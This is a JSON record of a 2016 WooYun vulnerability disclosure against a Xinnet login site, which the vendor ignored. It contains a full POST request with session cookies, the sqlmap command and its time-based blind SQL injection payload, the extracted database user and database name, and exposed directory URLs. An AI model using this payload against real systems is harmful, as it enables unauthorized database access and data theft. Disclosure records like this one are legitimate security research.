{"id": 86049, "wybug_id": "wooyun-2016-0200175", "wybug_title": "新网某站后台SQL注入&amp;目录遍历", "wybug_corp": "新网", "wybug_author": "路人甲", "wybug_date": "2016-04-27 22:03", "wybug_open_date": "2016-05-07 07:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 新网某站后台sql注入&&目录遍历 详细说明：  1. sql注入:站点：\nhttp://hcp.xinnet.com/\n用户名直接输入账号密码显示用户密码错误，在用户名出加单引号提示查询数据失败！ 存在注入！！\nPOST /loginAction.do?method=doLogin HTTP/1.1Host: hcp.xinnet.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Referer: http://hcp.xinnet.com/Cookie: s_sess=%20s_cc%3Dtrue%3B%20s_evar8%3D5%253A45PM%3B%20s_evar9%3DSunday%3B%20s_evar6%3DNew%3B%20s_evar7%3D1%3B%20s_sq%3Dveristemplate%253D%252526pid%25253Dxinnet%2525253Apc%2525253Axinnet%25252520landing%25252520page%252526pidt%25253D1%252526oid%25253Dhttp%2525253A%2525252F%2525252Fwww.xinnet.com%2525252Fdomain%2525252Fzt%2525252F2016com.html%252526ot%25253DA%3B; s_pers=%20s_vnum%3D1462032000151%2526vn%253D1%7C1462032000151%3B%20s_fid%3D1FCFD3B0ED1F8024-08BB5D93DED29CA4%7C1524563589198%3B%20s_nr%3D1461491589202-New%7C1464083589202%3B%20s_invisit%3Dtrue%7C1461493389205%3B; Hm_lvt_d8c85dc3da4ccc9862aa45a86f64b77e=1461491541; Hm_lpvt_d8c85dc3da4ccc9862aa45a86f64b77e=1461491541; __clickidc=146149154254810008; Hm_lvt_4a3d459f424b6b83ad11805cc3dc1e4a=1461491598; Hm_lpvt_4a3d459f424b6b83ad11805cc3dc1e4a=1461491598; JSESSIONID=211C03DAE9354C59174F13236554570AConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 49loginName=fdsfds&password=dfgdf&validateCode=7934\n保存在sqlmap目录下为1.txt文件loginName存在注入,直接sqlmap -r 1.txtpayload：\nParameter: loginName (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: loginName=fdsfds' AND (SELECT * FROM (SELECT(SLEEP(5)))SHKa) AND 'PPAZ'='PPAZ&password=dfgdf&validateCode=7934\n\nweb application technology: Servlet 2.4, Tomcat 4.0.2back-end DBMS: MySQL 5.0.12\n\ncurrent user:    'xinnetagent@10.2.24.529'current database:    'xinnet'\n\n\n注入存在！不深入=====================================================小分割线2.目录遍历：\nhttp://hcp.xinnet.com/pages/http://hcp.xinnet.com/styles/http://hcp.xinnet.com/scripts/\n\n\n   漏洞证明：  以上足以证明！！   修复方案：  你们更专业！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-05-07 07:10 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}